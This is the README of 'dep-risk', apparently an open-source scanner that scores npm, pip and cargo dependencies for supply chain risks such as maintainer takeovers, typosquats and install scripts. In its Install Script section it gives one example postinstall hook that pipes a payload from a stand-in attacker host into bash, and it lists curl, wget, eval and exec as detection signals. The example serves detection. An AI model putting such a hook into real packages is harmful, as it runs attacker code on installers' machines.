<div align="center">

# dep-risk

**Supply chain risk scorer for npm, pip, and cargo dependencies.**

[![Python](https://img.shields.io/badge/python-3.11%2B-blue?logo=python&logoColor=white)](https://python.org)
[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Ecosystems](https://img.shields.io/badge/ecosystems-npm%20%7C%20pip%20%7C%20cargo-orange)](https://github.com/dilates/dep-risk)

*Catches the attacks CVE scanners miss — maintainer takeovers, typosquatting, malicious install scripts, and ownership transfers.*

[Installation](#installation) · [Quick Start](#quick-start) · [How It Works](#how-it-works) · [CI Integration](#ci-integration) · [Configuration](#configuration) · [FAQ](#faq)

</div>

---

## Why dep-risk?

Snyk and Dependabot are great at catching known CVEs. They are blind to:

- A popular npm package whose maintainer account was sold to a bad actor last week
- A Python package sitting one typo away from `requests` — uploaded yesterday
- A crate whose `postinstall` script quietly `curl`s a remote payload
- A GitHub repo marked deprecated but still pulling thousands of weekly installs

dep-risk closes that gap. It scores every dependency across seven behavioural dimensions and surfaces the ones that deserve a second look — before they reach production.

---

## Terminal Output

```
╭─────────────────────────────────────────────────────────────╮
│ dep-risk scan — ./my-project                                │
│ 127 packages scanned across 3 ecosystems                    │
│ Completed in 4.2s (cached: 89, fresh: 38)                   │
╰─────────────────────────────────────────────────────────────╯

  CRITICAL       2  ████
  HIGH           7  ██████████████
  MEDIUM        18  ███████████████████████████████
  LOW          100

  Package            Version   Ecosystem   Score   Risk       Top Finding
 ─────────────────────────────────────────────────────────────────────────────
  malicious-pkg      1.0.2     npm            94   CRITICAL   Ownership transferred 2 days ago
  sketchy-util       2.1.0     npm            71   CRITICAL   Downloads during postinstall (curl)
  old-thing          0.3.1     pip            62   HIGH       Abandoned 4 years ago, no source
  event-stream       3.3.6     npm            58   HIGH       New maintainer added within 30 days
  axios              1.4.0     npm            25   MEDIUM     Single maintainer with no backup

╭─── malicious-pkg@1.0.2 (npm) — CRITICAL 94/100 ───────────────────────────╮
│  maintainer     ████████████████████  62pts  Ownership transferred 2d ago  │
│  install_script ████████████████      52pts  postinstall: curl | bash       │
│  activity       ████████              28pts  No commits in 18 months        │
│  typosquat      ░░░░░░░░░░░░░░░░░░░░   0pts  Not a known typosquat          │
│                                                                             │
│  Registry: https://registry.npmjs.org/malicious-pkg                        │
│  GitHub:   https://github.com/bad-actor/malicious-pkg                      │
╰─────────────────────────────────────────────────────────────────────────────╯
```

### Verbose Scorer Breakdown

Running `dep-risk --verbose --min-risk medium` shows per-scorer detail for every flagged package:

```
╭───────────────────── axios@1.4.0 (npm) — MEDIUM 25/100 ──────────────────────╮
│   maintainer     ███████████░░░░░░░░░    55pts  Single maintainer with no     │
│                                                  backup                       │
│   install_script ████████░░░░░░░░░░░░    40pts  Has install hook: prepare     │
│   activity       ░░░░░░░░░░░░░░░░░░░░     0pts  No activity concerns          │
│   typosquat      ░░░░░░░░░░░░░░░░░░░░     0pts  In top popular list           │
│   version        ███░░░░░░░░░░░░░░░░░    15pts  Weekend late-night release    │
│   github         ████░░░░░░░░░░░░░░░░    20pts  No GitHub repo found          │
│   entropy        ░░░░░░░░░░░░░░░░░░░░     0pts  Package name appears normal   │
│                                                                               │
│   Registry: https://registry.npmjs.org/axios                                 │
│   GitHub:   https://github.com/axios/axios                                   │
╰───────────────────────────────────────────────────────────────────────────────╯
```

### CI Mode

```
[CRITICAL] malicious-pkg@1.0.2 — score 94 — Ownership transferred 2 days ago
[HIGH]     sketchy-util@2.1.0  — score 71 — Downloads during postinstall (curl)
[HIGH]     old-thing@0.3.1     — score 62 — Abandoned 4 years ago, no source

dep-risk: 2 CRITICAL, 1 HIGH packages found. Failing CI.
```

---

## HTML Report

Running `dep-risk --output report.html` generates a fully self-contained HTML file with no external dependencies.

Features:
- **Dark security-tool aesthetic** — navy background, colour-coded risk levels
- **Interactive table** — click any column to sort; type to filter by package name
- **Sidebar filters** — toggle ecosystems and risk levels instantly
- **Expandable rows** — click "Show" to reveal per-scorer progress bars, evidence, and links
- **Donut chart** — live risk distribution that updates as you filter
- **CSV export** — download the current (filtered) view as a spreadsheet
- **Mobile-responsive** — works on any screen width
- **Zero external dependencies** — one `.html` file, works offline

```
┌────────────────────────────────────────────────────────────────────┐
│ dep-risk       │  Total  Critical  High  Medium                    │
│ v1.0.0         │   127      2       7      18                      │
│                │  ┌──────────────────────────────────────────┐    │
│ ./my-project   │  │ Search packages...              Export CSV│    │
│ 2024-01-15     │  ├──────┬───────┬───────┬───────┬─────┬─────┤    │
│ 4.2s           │  │Pkg   │ Ver   │ Eco   │ Score │Risk │ ... │    │
│                │  ├──────┼───────┼───────┼───────┼─────┼─────┤    │
│ [Donut chart]  │  │mal.. │ 1.0.2 │ npm   │  94   │CRIT │ ▶   │    │
│                │  │sket..│ 2.1.0 │ npm   │  71   │CRIT │ ▶   │    │
│ Risk Level     │  │old-..│ 0.3.1 │ pip   │  62   │HIGH │ ▶   │    │
│ ☑ Critical (2) │  │axios │ 1.4.0 │ npm   │  25   │MED  │ ▶   │    │
│ ☑ High (7)     │  └──────┴───────┴───────┴───────┴─────┴─────┘    │
│ ☑ Medium (18)  │                                                    │
│ ☑ Low (100)    │                                                    │
│                │  Generated by dep-risk v1.0.0 · github.com/dilates│
│ Ecosystem      │                                                    │
│ ☑ npm          │                                                    │
│ ☑ pip          │                                                    │
│ ☑ cargo        │                                                    │
└────────────────────────────────────────────────────────────────────┘
```

---

## Installation

### pip (recommended)

```bash
pip install dep-risk
```

### pipx (isolated, globally available)

```bash
pipx install dep-risk
```

### From source

```bash
git clone https://github.com/dilates/dep-risk
cd dep-risk
pip install -e .
```

### Requirements

- Python 3.11 or newer
- Internet access for the first scan (subsequent scans use the local cache)
- A GitHub token is optional but strongly recommended (raises rate limit from 60 to 5,000 req/hr)

---

## Quick Start

```bash
# Scan the current directory — auto-detects npm, pip, and cargo
dep-risk

# Scan a specific project
dep-risk /path/to/my-project

# Only show HIGH and CRITICAL findings
dep-risk --min-risk high

# Show full scorer breakdown for every flagged package
dep-risk --verbose

# Export a self-contained HTML report
dep-risk --output report.html

# Pipe JSON output to jq
dep-risk --json | jq '.[] | select(.risk_level == "critical")'

# Include dev dependencies
dep-risk --include-dev

# Use a GitHub token (or set the GITHUB_TOKEN env var)
dep-risk --github-token ghp_yourtoken
```

---

## How It Works

dep-risk fetches live data from npm, PyPI, crates.io, and GitHub, then runs every package through seven scorers. Each scorer returns a score from 0–100 and a weighted contribution to the final risk score.

### Risk Level Thresholds

| Score  | Level        | What it means |
|--------|-------------|---------------|
| 0–20   | `LOW`       | No significant supply chain concerns |
| 21–45  | `MEDIUM`    | Some signals present — review recommended |
| 46–70  | `HIGH`      | Significant signals — manual review required |
| 71–100 | `CRITICAL`  | Do not use without a thorough security review |

---

## The Seven Scorers

### Maintainer — 25%

Detects ownership changes and suspicious maintainer patterns.

| Signal | Points |
|--------|--------|
| Single maintainer with no backup | +20 |
| Maintainer exodus (>3 → 1 in 6 months) | +35 |
| New maintainer added within last 30 days, <5 other packages | +40 |
| New maintainer added within last **7 days** | +60 |
| Entire maintainer set replaced between versions | +50 |

**Why it matters:** The XZ Utils backdoor (CVE-2024-3094), the event-stream attack, and dozens of npm incidents all began with a new or compromised maintainer account gaining publish rights.

---

### Install Script — 30% *(highest weight)*

The #1 active attack vector in the npm ecosystem.

| Signal | Points |
|--------|--------|
| `preinstall` / `postinstall` / `install` / `prepare` hook present | +40 base |
| Hook contains `curl`, `wget`, `fetch`, or HTTP call | +70 |
| Hook contains `eval`, `exec`, or dynamic spawn | +60 |
| Hook reads `process.env` at install time | +30 |
| Script entropy > 4.5 bits/char (obfuscated) | +80 |
| pip: binary-only wheel, no source distribution | +50 |

**Example of what gets caught:**

```json
"scripts": {
  "postinstall": "curl https://c2.evil.example/payload.sh | bash"
}
```

Score: **110pts → capped at 100 → CRITICAL**

---

### Activity — 15%

Detects abandoned and zombie packages.

| Signal | Points |
|--------|--------|
| Last commit > 2 years ago | +30 |
| Last commit > 5 years ago | +50 |
| Zero commits in 90 days, but active issue filing | +20 |
| Registry release with no corresponding GitHub commits (>7 day gap) | +40 |
| Repository archived | +35 |
| No source repository link anywhere | +25 |

---

### Typosquatting — 20%

Checks every package name against a curated list of the top 1,000 most popular packages per ecosystem using Damerau-Levenshtein distance.

| Signal | Points |
|--------|--------|
| Edit distance 1 from a popular package | +70 |
| Edit distance 2 from a popular package | +35 |
| Homoglyph substitution (l↔1, O↔0, rn↔m, vv↔w) | +80 |
| Pluralization variant (`flask` → `flasks`) | +35 |
| Numbered variant (`axios` → `axios2`) | +25 |

Packages that **are** in the top-1,000 list are automatically scored 0 — no false positives on popular packages.

---

### Version Anomalies — 10%

| Signal | Points |
|--------|--------|
| Version released on weekend at 2am–5am UTC | +15 |
| Two major versions released within 24 hours | +25 |
| Large version skip (e.g. 1.0.1 → 1.9.9) | +20 |
| Version yanked / unpublished then re-released | +30 |
| First package ever published by this account | +20 |

---

### GitHub Health — 10%

| Signal | Points |
|--------|--------|
| No GitHub repository found | +20 |
| Repository archived | +35 |
| Stars < 10 | +30 |
| Fork count > 3× star count | +20 |
| 200+ open issues with no recent responses | +25 |
| No license | +20 |
| Topic includes `deprecated`, `unmaintained`, `archived` | +40 |

---

### Name Entropy — 5%

| Signal | Points |
|--------|--------|
| Shannon entropy > 3.8 bits/char (random-looking name) | +30 |
| Mixed case + numbers in unusual pattern | +20 |
| Name is 1–2 characters (high squatting risk) | +15 |
| Common word + number appended (`lodash3`, `vue2`) | +25 |

---

## Use Cases

### 1. Pre-merge dependency audit

Run dep-risk before merging any PR that adds or upgrades dependencies. Integrate it into your PR checklist:

```bash
dep-risk --ci --fail-on high --min-risk medium
```

If a new dependency scores HIGH or CRITICAL, the reviewer sees exactly why.

---

### 2. Scheduled supply chain monitoring

Your dependencies don't change, but the maintainers do. A package that was safe last month may have transferred ownership yesterday. Run dep-risk weekly to catch this:

```bash
# Weekly cron — alerts on any new HIGH findings
dep-risk --ci --fail-on high --no-cache
```

---

### 3. Security audit of an unfamiliar codebase

Joining a new project? Run dep-risk to get a quick risk map of the dependency tree:

```bash
dep-risk /path/to/project --min-risk medium --output audit-report.html --verbose
```

The HTML report gives you a filterable, sortable table you can share with stakeholders — no terminal required.

---

### 4. CI gate on new packages only

Use the JSON output to gate only on newly added dependencies without blocking existing ones:

```bash
# In CI: compare against a known-good baseline
dep-risk --json > current.json
jq --slurpfile base baseline.json '
  . as $curr |
  $curr | map(select(.risk_level == "critical" or .risk_level == "high")) |
  map(select(.name as $n | $base[0] | map(.name) | index($n) | not))
' current.json
```

---

### 5. Investigating a specific package

Combined with `--json` and `jq`, dep-risk doubles as a package intelligence tool:

```bash
# Full profile of one package
dep-risk . --json | jq '.[] | select(.name == "some-package")'

# List all packages with install scripts
dep-risk . --json | jq '.[] | select(.scores.install_script.score > 0) | {name, version, finding: .scores.install_script.finding}'

# Find packages with ownership changes
dep-risk . --json | jq '.[] | select(.scores.maintainer.evidence.ownership_transfer == true)'
```

---

### 6. Generating executive reports

```bash
dep-risk . --output security-report.html
```

The HTML report is self-contained — no server required, no external dependencies, no data leaves your machine. Email it directly to your security team.

---

## CI Integration

### GitHub Actions

```yaml
name: Supply Chain Audit
on:
  push:
    paths:
      - 'package*.json'
      - 'requirements*.txt'
      - 'Cargo.*'
      - 'Pipfile*'
      - 'pyproject.toml'
  schedule:
    - cron: '0 8 * * 1'   # also run every Monday

jobs:
  dep-risk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dep-risk
        run: pip install dep-risk

      - name: Run supply chain audit
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: dep-risk --ci --fail-on high

      - name: Upload HTML report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: dep-risk-report
          path: report.html
        # Generate the report regardless of pass/fail:
        # run: dep-risk --output report.html || true
```

---

### GitLab CI

```yaml
dep-risk:
  stage: security
  image: python:3.11-slim
  before_script:
    - pip install dep-risk
  script:
    - dep-risk --ci --fail-on high
  artifacts:
    when: always
    paths:
      - report.html
    expire_in: 30 days
  rules:
    - changes:
        - package*.json
        - requirements*.txt
        - Cargo.*
```

---

### Pre-commit Hook

```yaml
# .pre-commit-config.yaml
repos:
  - repo: local
    hooks:
      - id: dep-risk
        name: Supply chain risk check
        language: python
        entry: dep-risk --ci --fail-on critical
        additional_dependencies: [dep-risk]
        files: ^(package\.json|requirements.*\.txt|Cargo\.toml|pyproject\.toml)$
        pass_filenames: false
```

---

### Makefile

```makefile
.PHONY: security
security:
	dep-risk --ci --fail-on high --output security-report.html
	@echo "Report saved to security-report.html"
```

---

## JSON Output

All data is pipe-friendly. The `--json` flag writes to stdout; all progress output goes to stderr.

```bash
dep-risk --json | jq '.[] | select(.risk_level == "critical")'
```

**Output schema:**

```json
{
  "name": "event-stream",
  "version": "3.3.6",
  "ecosystem": "npm",
  "registry_url": "https://registry.npmjs.org/event-stream",
  "github_url": "https://github.com/dominictarr/event-stream",
  "total_score": 71.0,
  "risk_level": "critical",
  "flags": [
    "New maintainer added within 30 days: right9ctrl",
    "Has install hook: postinstall",
    "Downloads during postinstall (curl)"
  ],
  "fetch_errors": [],
  "scores": {
    "maintainer": {
      "scorer": "maintainer",
      "score": 40.0,
      "weight": 0.25,
      "finding": "New maintainer added within 30 days: right9ctrl",
      "detail": "New maintainer 'right9ctrl' added 22 days ago",
      "evidence": {
        "new_maintainer_right9ctrl": "2018-09-09T05:34:15.000Z"
      }
    },
    "install_script": {
      "scorer": "install_script",
      "score": 110.0,
      "weight": 0.30,
      "finding": "Downloads during postinstall (curl)",
      "detail": "postinstall script makes network requests",
      "evidence": {
        "scripts": { "postinstall": "node ./install.js" },
        "postinstall_downloads": true
      }
    }
  }
}
```

---

## Configuration

Create `.dep-risk.toml` in your project root, or `~/.dep-risk.toml` for a global default.

```toml
[dep-risk]
# Packages to skip — known-safe internal or vendor packages
exclude = ["my-internal-lib", "company-design-system"]

# Minimum risk level to display in the terminal
min_risk = "medium"

# Include dev/test dependencies (false by default)
include_dev = false

# CI failure threshold
fail_on = "high"

# GitHub token — prefer GITHUB_TOKEN env var instead
github_token = ""

# Parallel fetch workers (increase for large monorepos)
workers = 10

# Override scorer weights — will be renormalized to sum to 1.0
[dep-risk.weights]
maintainer    = 0.25
activity      = 0.15
install_script = 0.30
typosquat     = 0.20
version       = 0.10
github        = 0.10
entropy       = 0.05
```

Config file is looked up in this order:

1. Path passed via `--config`
2. `.dep-risk.toml` in the current directory
3. `~/.dep-risk.toml` in the home directory

---

## Caching

All registry and GitHub API responses are cached locally in `~/.cache/dep-risk/cache.db` (SQLite).

| Data source     | Default TTL |
|----------------|-------------|
| npm registry   | 1 hour      |
| PyPI           | 1 hour      |
| crates.io      | 1 hour      |
| GitHub API     | 6 hours     |

```bash
# Force fresh data (bypass cache)
dep-risk --no-cache
```

The cache is automatically pruned of expired entries on each run.

---

## Full CLI Reference

```
dep-risk [PATH] [OPTIONS]

Arguments:
  PATH                          Directory to scan (default: current directory)

Scan options:
  --ecosystem {npm,pip,cargo,auto}   Ecosystems to scan (default: auto-detect)
  --include-dev                      Include dev/test dependencies
  --min-risk {low,medium,high,critical}  Minimum level to display

Output options:
  --output FILE                 Export self-contained HTML report
  --json                        Write JSON array to stdout (stderr for progress)
  --verbose                     Show per-scorer breakdown for all flagged packages

CI options:
  --ci                          CI mode — structured output, non-zero exit on failures
  --fail-on {low,medium,high,critical}  Failure threshold (default: high)

Fetch options:
  --no-cache                    Bypass cache, always fetch fresh
  --github-token TOKEN          GitHub API token (or GITHUB_TOKEN env var)
  --workers N                   Concurrent fetch workers (default: 10)

Other:
  --config PATH                 Path to .dep-risk.toml config file
  --version                     Show version and author link
  --verbose                     Detailed scorer output per package
```

---

## FAQ

### Does dep-risk replace Snyk / Dependabot / npm audit?

No — and it's not trying to. dep-risk is complementary. CVE scanners tell you about known vulnerabilities in existing packages. dep-risk tells you about *behavioural* and *provenance* risk signals that CVE databases don't track: who owns the package now, whether the install script makes network calls, whether the name looks like a typosquat.

Run both.

---

### Why is a well-known package showing a MEDIUM score?

The most common reasons for false positives on legitimate packages:

1. **Single maintainer** — Many popular single-author packages score +20 on the maintainer signal. This is intentional: bus-factor is a real risk. Exclude trusted single-author packages with `exclude = ["package-name"]`.

2. **`prepare` / `postinstall` script** — Framework packages like `husky`, `electron`, and many native addons legitimately run post-install scripts. If you've audited the script and it's benign, exclude the package.

3. **Low GitHub stars** — New packages or packages migrated from a different repo may have low star counts. The star signal has low weight (10%) and only fires on packages with fewer than 10 stars.

4. **Weekend release** — Open-source maintainers release on their own schedule. This is a very-low-weight signal (version scorer = 10% total weight, weekend signal = 15 pts within it).

---

### How do I tune it for my project?

**Reduce noise by raising the minimum risk level:**

```toml
[dep-risk]
min_risk = "high"
fail_on = "critical"
```

**Reduce noise by excluding known-safe packages:**

```toml
[dep-risk]
exclude = [
  "electron",        # known postinstall script
  "husky",           # known postinstall script
  "my-private-pkg",  # internal package
]
```

**Reduce weight on signals you consider low-signal for your stack:**

```toml
# For a Rust project where build.rs is universal:
[dep-risk.weights]
install_script = 0.10
maintainer     = 0.35
typosquat      = 0.25
activity       = 0.15
version        = 0.08
github         = 0.05
entropy        = 0.02
```

Weights are automatically renormalized — they don't need to sum to exactly 1.0.

---

### What data is collected? Does dep-risk send my dependency list anywhere?

dep-risk makes outbound requests only to the official package registries (registry.npmjs.org, pypi.org, crates.io) and the GitHub API — the same requests your package manager already makes. Your project's file paths and dependency names are not sent anywhere else. All responses are cached locally in `~/.cache/dep-risk/cache.db`.

---

### Why does dep-risk need a GitHub token?

Without a token, the GitHub API allows 60 requests per hour per IP. With a token, that rises to 5,000. On a project with more than ~60 dependencies that have GitHub repos, you'll start hitting the rate limit and the GitHub scorer will be skipped for those packages (noted in `fetch_errors`). A token with no scopes (read-only) is sufficient.

```bash
export GITHUB_TOKEN=ghp_yourreadontlytoken
dep-risk
```

---

### My CI run is slow. How do I speed it up?

1. **Increase workers:** `dep-risk --workers 20` (more parallel HTTP requests)
2. **Let the cache warm up:** The first run fetches everything fresh. Subsequent runs within the TTL window are nearly instant.
3. **Scope the scan:** `dep-risk --ecosystem npm` if you only care about one ecosystem
4. **Raise the threshold:** `dep-risk --min-risk high` — this doesn't affect scan time but reduces output noise

---

### Can I scan a monorepo?

dep-risk scans a single directory. For a monorepo, run it against each workspace:

```bash
for workspace in packages/*/; do
  echo "--- $workspace ---"
  dep-risk "$workspace" --ci --fail-on high
done
```

Or collect JSON output from all workspaces:

```bash
for workspace in packages/*/; do
  dep-risk "$workspace" --json 2>/dev/null
done | jq -s 'flatten | unique_by(.name + .ecosystem)' > combined.json
```

---

### Does it support `pnpm`, `yarn`, `poetry`, `uv`?

| Tool | Support |
|------|---------|
| npm  | ✅ via `package-lock.json` |
| yarn | ✅ via `package.json` (lock file parsing: use `--no-lock` mode) |
| pnpm | ✅ via `package.json` |
| pip  | ✅ via `requirements*.txt` |
| poetry | ✅ via `pyproject.toml` (`[tool.poetry]`) |
| uv   | ✅ via `pyproject.toml` (`[project]`) |
| Pipenv | ✅ via `Pipfile` |
| cargo | ✅ via `Cargo.toml` and `Cargo.lock` |

---

## Development

```bash
git clone https://github.com/dilates/dep-risk
cd dep-risk
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"

# Run tests (no network calls)
pytest

# Run against the bundled fixtures
dep-risk tests/fixtures/ --no-cache --verbose
```

### Project Layout

```
dep_risk/
├── cli.py              Entry point, argument parsing
├── scanner.py          Async orchestrator — parsers → sources → scorers
├── config.py           TOML config loading
├── cache.py            SQLite TTL cache
├── parsers/            npm · pip · cargo dependency file parsers
├── sources/            npm registry · PyPI · crates.io · GitHub API clients
├── scorers/            Seven scorer modules + base dataclasses
└── report/             Rich terminal output · self-contained HTML report
```

### Adding a Scorer

1. Create `dep_risk/scorers/my_scorer.py` implementing `async def score(dep, registry_data, github_data) -> RiskScore`
2. Add it to `SCORERS` list in `scanner.py`
3. Add a default weight to `DEFAULT_WEIGHTS` in `config.py`
4. Write tests in `tests/test_scorers.py` using fixture data

---

## Support & Donations

dep-risk is free, open-source software. If it saves you from a supply chain incident — or just saves you time — consider buying me a coffee.

**Litecoin (LTC):**

```
LZkNEPvTt9MhGTHuYvhsGSPqw91odZRX4j
```

Any amount is appreciated and helps keep the project maintained.

---

## License

MIT © [dilates](https://github.com/dilates)

---

<div align="center">

*dep-risk v1.0.0 · [https://github.com/dilates](https://github.com/dilates)*

</div>
